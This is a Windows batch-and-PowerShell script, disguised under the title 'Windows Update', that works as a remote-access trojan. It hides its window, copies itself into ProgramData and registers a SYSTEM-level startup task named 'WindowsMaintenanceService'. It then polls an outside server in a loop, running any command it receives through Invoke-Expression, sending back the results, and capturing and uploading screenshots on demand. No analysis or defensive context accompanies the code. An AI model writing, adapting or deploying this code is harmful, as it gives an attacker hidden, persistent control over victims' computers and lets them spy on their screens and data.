@echo off
title Windows Update
set "SCRIPT_PATH=%~f0"
if "%1"=="hidden" goto :start

:: Lancement invisible direct en arrière-plan
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
exit /b

:start
powershell -NoProfile -ExecutionPolicy Bypass -Command "$env:SCRIPT_PATH='%~f0'; try { $InstallDir = 'C:\ProgramData\WindowsMaintenance'; $ScriptName = 'chev3.bat'; $TargetFile = Join-Path $InstallDir $ScriptName; if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }; if ($env:SCRIPT_PATH -ne $TargetFile) { Copy-Item -Path $env:SCRIPT_PATH -Destination $TargetFile -Force; $Action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"C:\ProgramData\WindowsMaintenance\chev3.bat\" hidden'; $Trigger = New-ScheduledTaskTrigger -AtStartup; $Principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0); Register-ScheduledTask -TaskName 'WindowsMaintenanceService' -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null; Start-Process -FilePath $TargetFile -ArgumentList 'hidden' -WindowStyle Hidden; exit }; $f = $env:SCRIPT_PATH; $l = [System.IO.File]::ReadAllLines($f, [System.Text.Encoding]::UTF8); $idx = [array]::IndexOf($l, '##POWERSHELL-CODE-START##'); if ($idx -lt 0) { throw 'Marqueur introuvable' }; Invoke-Expression ([string]::Join([Environment]::NewLine, $l[($idx+1)..$l.Length])) } catch { Start-Sleep -Seconds 5 }"
exit /b

##POWERSHELL-CODE-START##
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ServerURL   = "https://apayan.crampteur.com/api/poll"
$BaseAPI     = "https://apayan.crampteur.com"
$id          = "${env:COMPUTERNAME}_${env:USERNAME}"
$IntervalSec = 5
$TimeoutSec  = 10
$BackoffMin  = 5
$BackoffMax  = 300

$url       = "{0}?id={1}" -f $ServerURL, [uri]::EscapeDataString($id)
$failures  = 0
$downSince = $null

while ($true) {
    $wait = $IntervalSec
    $ok   = $false
    $res  = $null

    try {
        $res = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec $TimeoutSec -ErrorAction Stop
        $ok  = $true
    }
    catch {
        $failures++
        if (-not $downSince) { $downSince = Get-Date }
        $wait = [Math]::Min($BackoffMax, $BackoffMin * [Math]::Pow(2, [Math]::Min($failures - 1, 6)))
        $wait = [int]($wait + (Get-Random -Minimum 0 -Maximum ([int]($wait * 0.2) + 1)))
    }

    if ($ok) {
        if ($failures -gt 0) {
            $failures  = 0
            $downSince = $null
        }

        try {
            if ($res -and $res.cmd) {
                if ($res.cmd.StartsWith("SCREEN_CAPTURE_TASK")) {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
                    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                    $ms = New-Object System.IO.MemoryStream
                    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                    $base64 = [Convert]::ToBase64String($ms.ToArray())
                    
                    $body = @{ id = $id; image = $base64 } | ConvertTo-Json
                    Invoke-RestMethod -Uri "$BaseAPI/api/upload_screen" -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
                }
                else {
                    try {
                        $output = Invoke-Expression $res.cmd 2>&1 | Out-String
                        if ([string]::IsNullOrEmpty($output)) { $output = "[EXÉCUTÉ SANS RETOUR]" }
                    } catch {
                        $output = "[ERREUR D'EXECUTION] $_"
                    }

                    $body = @{ id = $id; output = $output } | ConvertTo-Json
                    Invoke-RestMethod -Uri "$BaseAPI/api/result" -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
                }
            }
        }
        catch {
            # Erreur de traitement interne ou de retour réseau isolée
        }
    }

    Start-Sleep -Seconds $wait
}
```[cite: 3, 6]